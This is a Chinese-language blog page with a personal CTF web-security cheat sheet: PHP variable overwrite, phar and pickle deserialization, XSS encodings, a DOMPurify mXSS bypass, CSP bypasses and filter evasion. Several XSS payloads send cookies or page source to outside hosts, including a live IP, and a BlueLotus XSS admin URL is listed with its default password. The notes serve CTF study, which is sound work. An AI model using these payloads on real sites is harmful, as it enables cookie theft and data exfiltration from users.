<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2025/01/04/My CTF Memo(持续更新)/"> 
                    置顶-持续更新中的CTF备忘录 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2025-01-04   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="My-CTF-Memo-持续更新"><a href="#My-CTF-Memo-持续更新" class="headerlink" title="My CTF Memo(持续更新)"></a>My CTF Memo(持续更新)</h1><p>自己比赛过程中使用的笔记，一些基础的知识点整理，如果自己还有机会打比赛会陆续push到这篇文章中</p>
<h1 id="各种配置文件位置"><a href="#各种配置文件位置" class="headerlink" title="各种配置文件位置"></a>各种配置文件位置</h1><h2 id="nginx配置文件"><a href="#nginx配置文件" class="headerlink" title="nginx配置文件"></a>nginx配置文件</h2><p>常用于查看路由转发，可能把flag藏到哪个路径</p>
<pre><code>/usr/local/nginx/conf/nginx.conf
/etc/nginx/nginx.conf</code></pre><h2 id="nginx日志"><a href="#nginx日志" class="headerlink" title="nginx日志"></a>nginx日志</h2><pre><code>/var/log/nginx/access.log;
/var/log/nginx/error.log</code></pre><h1 id="PHP知识"><a href="#PHP知识" class="headerlink" title="PHP知识"></a>PHP知识</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>两个字节可以异或出来不同的字母，然后字符串的异或也是按位进行的，每个字节和对应的字节进行异或然后拼接</p>
<p><img src="http://static.zybuluo.com/1160307775/83s1wac85uhpalqusrqvv2lf/image_1dl3pck7o1600130m19djirkkbd1p.png" alt="image_1dl3pck7o1600130m19djirkkbd1p.png-81.7kB"></p>
<h2 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h2><p>php命名变量支持使用大括号包裹，但是仍然要使用$符号<br><img src="http://static.zybuluo.com/1160307775/l9b1p48gsdxb98yafs1syn1y/image_1dnc6tbnmb3u18e4r7320b155e9.png" alt="image_1dnc6tbnmb3u18e4r7320b155e9.png-58.9kB"></p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>通常造成漏洞点就是extract，和$符号的使用。典型的SESSION覆盖例子如下</p>
<pre><code>&lt;?php
    session_start();

    foreach (array_keys($_REQUEST) as $v) {
        $key = $v;
        $$key = $_REQUEST[$v];
    }</code></pre><p>poc:<code>index.php?_SESSION[admin]=true</code></p>
<p>在php中，无论cookie/session/get/post都是一个数组，通过hpp传入一个数组(‘admin’=&gt;true)，覆盖各种值。</p>
<p>上面的poc，在变量覆盖的层面表达如下：</p>
<pre><code>$_SESSION = array(&#39;admin&#39;=&gt;&#39;true&#39;);</code></pre><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>对于一些PHP文件，可以用P神最近的项目来审:<a href="https://phpchip.com/" target="_blank" rel="noopener">https://phpchip.com/</a></p>
<p>挖掘动态PHP代码中存在的安全隐患，而且包含了很多函数，对于小型CTF的代码的自动审计来说够用了。</p>
<p><img src="http://static.zybuluo.com/1160307775/hbq2u24im63am63sj6k6r3pv/image_1dsgmve7218qm1j5mbchsl03a99.png" alt="image_1dsgmve7218qm1j5mbchsl03a99.png-37.8kB"></p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><ul>
<li>在反序列化的时候，不会执行__construct里的值</li>
<li>原类中无法控制的private/protected变量，可以自己用构造方法序列化进去</li>
<li>php允许动态调用函数，函数名可以是字符串<br><img src="http://static.zybuluo.com/1160307775/dlevq47gan2c6hcjiaip5pxp/image_1di9sfr2g6gpga81h0t12mod9i9.png" alt="image_1di9sfr2g6gpga81h0t12mod9i9.png-61.4kB"></li>
</ul>
<p>如果要在类内动态调用函数，则需要用大括号包裹<br><img src="http://static.zybuluo.com/1160307775/mtwa9vsmcizlna828gu6ns89/image_1di9sjrriems2t1djm40b67d3m.png" alt="image_1di9sjrriems2t1djm40b67d3m.png-154.3kB"></p>
<ul>
<li>找到反序列化的入口很关键</li>
<li>反序列化的时候，php根据长度去读取值，所以双引号不会被转译，如下面的例子，它的a的值长度为8，所以php知道从哪里开始&amp;哪里结束，就没必要转移双引号。<br><img src="http://static.zybuluo.com/1160307775/h0si6pyl99969588wkx7bo65/image_1dmq5jh6dt671mc81i4f1idod1t9.png" alt="image_1dmq5jh6dt671mc81i4f1idod1t9.png-202.7kB"></li>
</ul>
<h2 id="代码审计骚操作"><a href="#代码审计骚操作" class="headerlink" title="代码审计骚操作"></a>代码审计骚操作</h2><h3 id="属性值逃逸"><a href="#属性值逃逸" class="headerlink" title="属性值逃逸"></a>属性值逃逸</h3><p>在常识中提到一点就是php识别value的长度来取值，如果定义的长度大于value的真实长度往后面继续填充字符，直到满足长度。</p>
<p>这里就存在一个问题，如果说我们序列化的内容是某一属性的内容，如果有类似于replace的操作改变属性值的长度，攻击者就可以构造出来一个”长度固定”的内容，里面夹杂着pop链，让php反序列在识别内容的时候到pop链的地方终止，而pop链就可以被反序列化。</p>
<p>具体的一个漏洞分析可以看：<a href="https://xz.aliyun.com/t/6521" target="_blank" rel="noopener">Joomla3.4.6-RCE</a></p>
<p>这个漏洞的核心点就是：传入的<code>username</code>包含\0\0\0，在session_start的时候调用read()进行反序列化，因为<code>username</code>的长度不匹配，就会向后继续填充字段。我们在<code>password</code>构造剩余字段长度+pop链。剩余字段长度用来填充<code>username</code>，然后pop链会被反序列化</p>
<h2 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h2><p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
<h3 id="phar通用"><a href="#phar通用" class="headerlink" title="phar通用"></a>phar通用</h3><p>利用条件：</p>
<ul>
<li>有一个文件上传点，上传白名单的文件，里面是phar序列化的值</li>
<li>能够触发phar的函数，参数要可控</li>
<li>当应用层过滤了phar://时，可以用<code>php://filter/source=phar://xxx</code>绕过</li>
</ul>
<p>能够触发的函数:</p>
<pre><code>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</code></pre><p>通用phar文件写法：</p>
<pre><code>&lt;?php 
class someclass{
}

@unlink(&quot;hpdoger.phar&quot;);
$test = new someclass(); // 实例化要用的类，可以给属性赋值
$phar = new Phar(&quot;hpdoger.phar&quot;);

$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头
$phar-&gt;setMetadata($test);
$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件
$phar-&gt;stopBuffering();

rename(&quot;hpdoger.phar&quot;,&quot;hpdoger.gif&quot;); //更改后缀名
?&gt;</code></pre><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><h3 id="调用pickle"><a href="#调用pickle" class="headerlink" title="调用pickle"></a>调用pickle</h3><p>序列化</p>
<pre><code>pickle.dump(文件) 
pickle.dumps(字符串)</code></pre><p>反序列化</p>
<pre><code>pickle.load(文件)
pickle.loads(字符串)</code></pre><h3 id="flask低版本session反序列化"><a href="#flask低版本session反序列化" class="headerlink" title="flask低版本session反序列化"></a>flask低版本session反序列化</h3><p>1.5以下版本的flask处理Session使用的是pickle，所以存在反序列化-rce</p>
<h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h3><p>这个函数也存在反序列化漏洞</p>
<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://www.smi1e.top/%e4%bb%8ebalsn-ctf-pyshv%e5%ad%a6%e4%b9%a0python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/" target="_blank" rel="noopener">从Balsn CTF pyshv学习python反序列化</a></p>
<p><a href="https://www.anquanke.com/post/id/188981#h2-0" target="_blank" rel="noopener">Python pickle 反序列化实例分析</a></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="常识-1"><a href="#常识-1" class="headerlink" title="常识"></a>常识</h2><h3 id="各种xss标签-属性-poc"><a href="#各种xss标签-属性-poc" class="headerlink" title="各种xss标签/属性-poc"></a>各种xss标签/属性-poc</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
<h3 id="dom结构"><a href="#dom结构" class="headerlink" title="dom结构"></a>dom结构</h3><p>取url中”#”后面的字符串</p>
<pre><code>document.location.hash.substr(1)</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><p>javascript支持的unicode格式是:<code>\uxxxx</code>，其中xxxx代表四位16进制数值，通常我们说的<code>a</code>的ascii码为<code>97</code>(10进制表示)，转换成unicode(16进制)就是<code>61</code>，缺位补0，最终的效果就是<code>\u0061</code><br><img src="http://static.zybuluo.com/1160307775/x4sqpwimtex6xuer47ljmui1/image_1dpsb5m4g1tpr1ju810j12q67vi9.png" alt="image_1dpsb5m4g1tpr1ju810j12q67vi9.png-2.8kB"></p>
<p>写一个函数可以转换String-&gt;unicode</p>
<pre><code>function str2unicode(char){
    return &quot;\\u&quot; + char.charCodeAt().toString(16).padStart(4,00)
}

str2unicode(&quot;a&quot;)</code></pre><p>在含有javascript语意的地方可以用unicode绕过某些过滤</p>
<pre><code>eval(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)
=&gt;
eval(&quot;alert(1)&quot;)</code></pre><p>直接在控制台运行<code>\u0061\u006c\u0065\u0072\u0074(1)</code>也一样。es6以后支持使用<code>\u{xxxx}</code>的写法，所以下面两种unicode的表达形式一样:</p>
<pre><code>\u{0061}
\u0061</code></pre><h4 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h4><p>&amp;#106=&amp;#0000106</p>
<p>有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位。浏览器接受html编码的时候，会转换为对应的字符。但是对于<code>&lt;、&gt;、#、&amp;、&quot;</code>这些字符，也有相应的html编码，但是浏览器会把它们解释成实体编码的符号再输出，即<code>&amp;#34;</code>转化<code>&amp;quot;</code>再呈现到页面显示为<code>&quot;</code>。</p>
<p>这种情况有时候可以绕过waf，当输出点在Html标签时可以尝试用<code>&amp;#34;</code>，因为是html语境会先进行一次html解码，解释为正常的<code>&quot;</code></p>
<h4 id="utf8-utf16-utf32"><a href="#utf8-utf16-utf32" class="headerlink" title="utf8/utf16/utf32"></a>utf8/utf16/utf32</h4><p>可以绕过xss-auditor，具体看这篇文章：<a href="http://d1iv3.me/2017/08/05/XSS%E4%B8%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81-UTF-7-UTF-8-UTF-16-UTF-32/?nsukey=Eeg77mV0jrAMDctXgPEgMcQdPwI0tpMDjpJrZSh5NdtQwOYv%2FnEgOlImAU92fuuh6dSHidilPty6DWoPn7gvdXd%2FxK5gISZXUuzI8Y6EdZXPEGz9Beg2e%2BNNzDKZ65Lof%2B6eMg9DtcJGKu5ntRRMm6lVhwQZ2QrgGwwnMu%2Bp38SLHYVNrml6aKuFF3sDwR1JnU3%2BcG8MI0VWLfhyzEP14w%3D%3D" target="_blank" rel="noopener">XSS与字符编码(UTF-7, UTF-8, UTF-16, UTF-32</a></p>
<p>生成对应编码的payload如下：</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))
%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h3 id="svg-amp-style"><a href="#svg-amp-style" class="headerlink" title="svg&amp;style"></a>svg&amp;style</h3><p>在<code>&lt;style&gt;</code>标签中不允许存在子标签(style标签最初的设计理念就不能用来放子标签)，如果存在会被当作text解析，这也就是Chrome的Text模式，如下图所示。</p>
<p><img src="http://static.zybuluo.com/1160307775/1drqlgt54g11k4z1iks7vt39/image_1ds71a2161dc61kknfq01prg8s6m.png" alt="image_1ds71a2161dc61kknfq01prg8s6m.png-36.6kB"></p>
<p>但是在<code>&lt;svg&gt;</code>标签下，若存在子标签<code>&lt;style&gt;</code>，则<code>&lt;style&gt;</code>标签中的子标签是可以被解析为html正常标签的，如下图。原因就是当你在HTML中打开<code>&lt;svg&gt;</code>时，浏览器的解析规则会发生变化，解析规则趋于XML解析而不是HTML解析</p>
<p><img src="http://static.zybuluo.com/1160307775/k3tiztcxhj1txqw12kadolw2/image_1ds71f9af1khd1rl81v3fme812b322.png" alt="image_1ds71f9af1khd1rl81v3fme812b322.png-41kB"></p>
<h4 id="mXSS-突变XSS基础标签"><a href="#mXSS-突变XSS基础标签" class="headerlink" title="mXSS(突变XSS基础标签)"></a>mXSS(突变XSS基础标签)</h4><p><code>&lt;svg&gt;</code>的子标签不能存在<code>&lt;p&gt;</code>，因为<code>&lt;p&gt;</code>是svg的非法标签，如果存在则会被当作同级标签处理。我们拿<code>a</code>和<code>p</code>来作为子标签比较如下<br><img src="http://static.zybuluo.com/1160307775/p1r0b27xj7qcnheu8pe9j6ue/image_1ds76d021te0165h8jjqbb1nf12s.png" alt="image_1ds76d021te0165h8jjqbb1nf12s.png-38.9kB"></p>
<h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML跟浏览器的解析规则一样：会自动补全标签</p>
<h3 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h3><p>DOMPurify是防止XSS的前端库，介绍和用法见:<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">https://github.com/cure53/DOMPurify</a></p>
<p>默认配置下，DOMPurify允许所有标签(<code>&lt;div&gt;</code>，<code>&lt;svg&gt;</code>，<code>&lt;p&gt;</code>，<code>&lt;style&gt;</code>和<code>&lt;a&gt;</code>)和属性id。所以它不会改变代码中的任何内容。</p>
<p>因此产生了一种bypass方式，利用点：</p>
<ul>
<li>DOMPurify &lt; 2.0.1</li>
<li>页面某处调用两次innerHTML</li>
</ul>
<p>漏洞原理大致意思：<br>我们把xss语句放进id属性里，前面跟上<code>&lt;style&gt;</code>标签，并用<code>&lt;svg&gt;</code>标签作为父标签。利用innerHTML的特性：跳出<code>&lt;svg&gt;</code>，这样<code>style</code>标签就会把后面的内容作为text处理，从而把id里面的<code>&lt;img&gt;</code>标签解析为html，payload如下:</p>
<pre><code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;</code></pre><p>经过Dumpurify清洗之后，不会有任何变化。然后把这个值进行两次innerHTML赋值，就能弹窗了，流程:</p>
<pre><code>第一次innerHTML =&gt; &lt;svg&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt; 

第二次innerHTML =&gt; &lt;svg&gt;&lt;/svg&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;&quot;&amp;gt; #跳出svg,成功弹窗</code></pre><p>不懂得可以先一下笔记mXSS，漏洞相关文档:<a href="https://xz.aliyun.com/t/6413" target="_blank" rel="noopener">利用突变XSS绕过DOMPurify 2.0.0</a></p>
<p>第二次innerHTML的时候，svg和p变成了兄弟标签，从而style标签开始text解析模式读到<code>&lt; id=&quot;&quot;</code>，之后就把img标签解析成html了。</p>
<h3 id="DOM-Clobbering-Attack"><a href="#DOM-Clobbering-Attack" class="headerlink" title="DOM Clobbering Attack"></a>DOM Clobbering Attack</h3><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/</a></p>
<p>id值可以创造window.xxx/全局变量</p>
<pre><code>&lt;img id=&quot;hpdoger&quot;&gt; 等价于 window.hpdoger 等价于 hpdoger</code></pre><p>name值可以创造document.xxx变量</p>
<pre><code>&lt;img name=&quot;hpdoger&quot;&gt; 等价于 document.hpdoger</code></pre><h2 id="各种标签"><a href="#各种标签" class="headerlink" title="各种标签"></a>各种标签</h2><h3 id="js创建标签"><a href="#js创建标签" class="headerlink" title="js创建标签"></a>js创建标签</h3><pre><code>script=document.createElement(&#39;script&#39;);script.src=&#39;//bo0om.ru/csp.js&#39;;document.body.appendChild(script);</code></pre><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><p>可以用autofocus  猫哥给的，感觉不能onload的标签都可以试一下。不过这个需要点击一下才能触发</p>
<pre><code>&lt;a contenteditable onfocus=alert(document.location) autofocus href=&quot;aaa&quot;&gt;aaaaaaaaaaaaa&lt;/a &gt;</code></pre><p>还有一个更骚的，利用锚点自动聚焦触发，只需要在url后面加#1</p>
<pre><code>&lt;a onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/a &gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ett6l17ebtak7tpieba9qah9/image_1dkpti8oq1ab21r101am733omkc9.png" alt="image_1dkpti8oq1ab21r101am733omkc9.png-45.1kB"></p>
<h3 id="frameset标签"><a href="#frameset标签" class="headerlink" title="frameset标签"></a>frameset标签</h3><pre><code>&lt;frameset onpageshow=alert(1)&gt;</code></pre><h2 id="各种协议"><a href="#各种协议" class="headerlink" title="各种协议"></a>各种协议</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><p>data:text/html</p>
<p>适用于src属性后面，能解析js语句的函数(例如eval,setTimeout)</p>
<pre><code>data:text/html;base64,xxxx</code></pre><p>注意点：<br>1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码</p>
<p>2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64</p>
<pre><code>eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)</code></pre><p>这个用法的例子见:<a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
<h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p>搭建的蓝莲花xss平台：<a href="http://120.79.152.66:8000/admin.php" target="_blank" rel="noopener">http://120.79.152.66:8000/admin.php</a></p>
<p>默认密码:<strong>bluelotus</strong></p>
<p>可以导入模版，然后修改地址为自己的平台url，点击<strong>生成payload</strong>就可以看到js所在路径<br><img src="http://static.zybuluo.com/1160307775/12ow2gpzv3ed0bhcd86pm8ea/image_1diml87oh5dg1iuqed313gu16pc9.png" alt="image_1diml87oh5dg1iuqed313gu16pc9.png-196.5kB"></p>
<p>还可以进行一些编码<br><img src="http://static.zybuluo.com/1160307775/0op7d8bksx2xdqbj6s1xe6ov/image_1diml9qdf1j26gs4knb1tcc9r5m.png" alt="image_1diml9qdf1j26gs4knb1tcc9r5m.png-78.1kB"></p>
<h2 id="打页面源码"><a href="#打页面源码" class="headerlink" title="打页面源码"></a>打页面源码</h2><h3 id="当前页面"><a href="#当前页面" class="headerlink" title="当前页面"></a>当前页面</h3><pre><code>&lt;svg/onload=&quot;document.location=&#39;http://120.79.152.66:8000/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><h3 id="其他页面"><a href="#其他页面" class="headerlink" title="其他页面"></a>其他页面</h3><pre><code>&lt;script&gt;
function createXmlHttp() {
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest()
    } else {
        var MSXML = new Array(&#39;MSXML2.XMLHTTP.5.0&#39;, &#39;MSXML2.XMLHTTP.4.0&#39;, &#39;MSXML2.XMLHTTP.3.0&#39;, &#39;MSXML2.XMLHTTP&#39;, &#39;Microsoft.XMLHTTP&#39;);
        for (var n = 0; n &lt; MSXML.length; n++) {
            try {
                xmlHttp = new ActiveXObject(MSXML[n]);
                break
            } catch(e) {}
        }
    }
}
createXmlHttp();
xmlHttp.onreadystatechange = function(){
  if (xmlHttp.readyState == 4) {
        code=escape(xmlHttp.responseText);
        createXmlHttp();
        url = &quot;http://120.79.152.66:8001/?code&quot;;   //这里是我们服务器接受的地址
        cc = &quot;htmlcode=&quot; + code +&quot;&amp;filename=hint.html&quot;;
        xmlHttp.open(&quot;POST&quot;, url, true);
        xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
        xmlHttp.send(cc)
  }
};
xmlHttp.open(&quot;GET&quot;, &quot;/hint.html&quot;, true);//这块填写获得的后台地址。
xmlHttp.send(null);
&lt;/script&gt;</code></pre><p>还可以使用fetch这个异步请求捕捉页面。</p>
<pre><code>fetch(&#39;/admin.html&#39;).then(x =&gt; x.text()).then(x =&gt; {
    location = &#39;http://rwx.kr/?d=&#39; + btoa(x);
});</code></pre><h2 id="打cookie"><a href="#打cookie" class="headerlink" title="打cookie"></a>打cookie</h2><h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><pre><code></code></pre><h3 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h3><pre><code>window.location = &#39;http://120.79.152.66&#39;+document.cookie</code></pre><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><pre><code>new Image().src=&#39;http://120.79.152.66/flag=&#39;+document.cookie</code></pre><h2 id="XHR请求"><a href="#XHR请求" class="headerlink" title="XHR请求"></a>XHR请求</h2><pre><code>xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    {
        document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="CSP相关"><a href="#CSP相关" class="headerlink" title="CSP相关"></a>CSP相关</h2><h3 id="查询csp缺陷"><a href="#查询csp缺陷" class="headerlink" title="查询csp缺陷"></a>查询csp缺陷</h3><p>复制浏览器返回的csp头，到:<a href="https://csp-evaluator.withgoogle.com/，可以查看当前csp的缺陷(比如，忘了设置什么)" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/，可以查看当前csp的缺陷(比如，忘了设置什么)</a><br><img src="http://static.zybuluo.com/1160307775/pcn97h1b3fyb4s0ue8rb01ne/image_1dq9cm5f1k7tdjkukd12vuq99.png" alt="image_1dq9cm5f1k7tdjkukd12vuq99.png-81.3kB"></p>
<h3 id="window-location-1"><a href="#window-location-1" class="headerlink" title="window.location"></a>window.location</h3><p>这个东西可以bypass csp，因为他不属于资源</p>
<pre><code>window.location = &#39;http://120.79.152.66&#39;+document.cookie</code></pre><p>可以看总结：<a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p>
<h3 id="csp限制目录bypass"><a href="#csp限制目录bypass" class="headerlink" title="csp限制目录bypass"></a>csp限制目录bypass</h3><p><img src="http://static.zybuluo.com/1160307775/fva575tblvauko4na3f5grzw/image_1dil1li3v1k224l1g3q5cc16v49.png" alt="image_1dil1li3v1k224l1g3q5cc16v49.png-160.9kB"></p>
<p>csp目录限制<code>content=&quot;script-src pastebin.com/XYZ/&quot;</code></p>
<p>但是用这种方法可以跨目录加载到<code>pastebin.com/b0Rajxqk</code>的js文件</p>
<p>具体原理应该是rpo:<a href="https://www.jianshu.com/p/5b174dcba362" target="_blank" rel="noopener">RPO攻击导致的XSS</a></p>
<h3 id="iframe来bypassCSP"><a href="#iframe来bypassCSP" class="headerlink" title="iframe来bypassCSP"></a>iframe来bypassCSP</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p>
<p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p>
<h3 id="Access-control-allow-origin"><a href="#Access-control-allow-origin" class="headerlink" title="Access-control-allow-origin"></a>Access-control-allow-origin</h3><p>当Access-control-allow-origin指定origin的时候，考虑下面一种情况也可以Bypass CSP(CORS的错误配置):</p>
<p>CSP页面<strong>存在缓存记录</strong>且“Access-Control-Allow-Origin”已经被设置，但是“Access-Control-Allow-Credentials: true”并且“Vary: Origin”头没有被设置(或者不存在)</p>
<p>可以利用缓存进行XSS-&gt;加载远程的JS脚本=&gt;bypass CSP<br>具体文章可以看这一篇：<a href="https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点</a></p>
<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="unicode-1"><a href="#unicode-1" class="headerlink" title="unicode"></a>unicode</h3><p>eval的绕过，通过填充\u0028换行分割符、\u2029段落分隔符</p>
<pre><code>eval(&#39;\u2028alert\u2029(1)&#39;)</code></pre><h3 id="浏览器解析"><a href="#浏览器解析" class="headerlink" title="浏览器解析"></a>浏览器解析</h3><h4 id="域名中的点号"><a href="#域名中的点号" class="headerlink" title="域名中的点号"></a>域名中的点号</h4><pre><code>%E3%80%82
=&gt; url解码为: &quot;。&quot; 
=&gt;浏览器会把它解释为 &quot;.&quot; 
=&gt; bypass &quot;.&quot;的限制</code></pre><p>还有一种bypass来绕过window.location.host的判断<br><img src="http://static.zybuluo.com/1160307775/k2e2blpvm3rnuzmxhj4k78ue/image_1dtkt6ll71mmvjuh1bg5egq12bq9.png" alt="image_1dtkt6ll71mmvjuh1bg5egq12bq9.png-12.5kB"></p>
<p>在域名的后面加”.”号就行了，即<code>treasure.npointer.cn.</code>解析到<code>treasure.npointer.cn</code></p>
<p><img src="http://static.zybuluo.com/1160307775/d4bgmtnynalf5wseokjwqbsp/image_1dtkta0tr14jj19pi1shju2n1gg32c.png" alt="image_1dtkta0tr14jj19pi1shju2n1gg32c.png-9.6kB"></p>
<h4 id="突破双引号限制"><a href="#突破双引号限制" class="headerlink" title="突破双引号限制"></a>突破双引号限制</h4><p>如果我们因为某个双引号，js报错的话，可以使用注释的方法，注释最后一个正确双引号后的所有内容。</p>
<p>看hitcon2019的例子，这里我们有三个双引号，但是依然可以跳转到<code>https://hpdoger.cn?document.cookie</code>，原因就是后面的<code>·--&gt;</code>可以注释后面的语句，即注释了后面的双引号。</p>
<p>原理就是–&gt;可以被当作注释符号，但必须有<code>\n</code>和<code>\r</code>来换行，才能注释。<br><img src="http://static.zybuluo.com/1160307775/z3bov0lhmusb9um8n8g690qn/image_1dneipo85gfdao1v301iq170q9.png" alt="image_1dneipo85gfdao1v301iq170q9.png-130.7kB"></p>
